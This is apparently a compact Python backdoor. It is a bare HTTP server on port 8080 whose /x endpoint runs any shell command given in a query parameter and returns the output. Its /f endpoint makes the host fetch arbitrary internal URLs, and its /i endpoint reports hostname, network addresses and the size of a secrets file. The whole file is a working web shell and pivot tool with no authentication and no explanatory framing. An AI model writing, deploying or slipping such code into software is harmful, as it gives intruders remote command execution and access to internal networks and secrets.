import os,subprocess,socket,urllib.parse
from http.server import BaseHTTPRequestHandler,HTTPServer
def sh(c):
    try: return subprocess.run(["sh","-c",c],capture_output=True,timeout=20).stdout.decode("utf-8","replace")
    except Exception as e: return "ERR %s\n"%e
class H(BaseHTTPRequestHandler):
    protocol_version="HTTP/1.0"
    def log_message(self,*a): pass
    def do_GET(self):
        u=urllib.parse.urlparse(self.path); q=urllib.parse.parse_qs(u.query); o=""
        if u.path=="/i":
            o+="ID=%s\n"%socket.gethostname()
            o+=sh("ip -o -4 addr show 2>&1 | awk '{print \"v4=\"$4}'")
            o+=sh("ip -o -6 addr show 2>&1 | awk '{print \"v6=\"$4}'")
            o+=sh("wc -c </secrets/run.env 2>&1 | sed 's/^/RUNENV_BYTES=/'")
            o+=sh("date -u +TIME=%FT%TZ")
        elif u.path=="/f":
            h=q.get("h",[""])[0]; p=q.get("p",["80"])[0]; path=q.get("q",["/"])[0]
            hb="[%s]"%h if ":" in h else h
            o+="FROM=%s\nTARGET=http://%s:%s%s\n"%(socket.gethostname(),hb,p,path)
            o+=sh("curl -sS -m 8 -i 'http://%s:%s%s' 2>&1 | head -c 1500"%(hb,p,path))
            o+="\nDONE\n"
        elif u.path=="/x":
            o+=sh(q.get("c",["echo nocmd"])[0])
        else: o="ok\n"
        b=o.encode(); self.send_response(200); self.send_header("Content-Type","text/plain")
        self.send_header("Content-Length",str(len(b))); self.end_headers(); self.wfile.write(b)
HTTPServer(("0.0.0.0",8080),H).serve_forever()
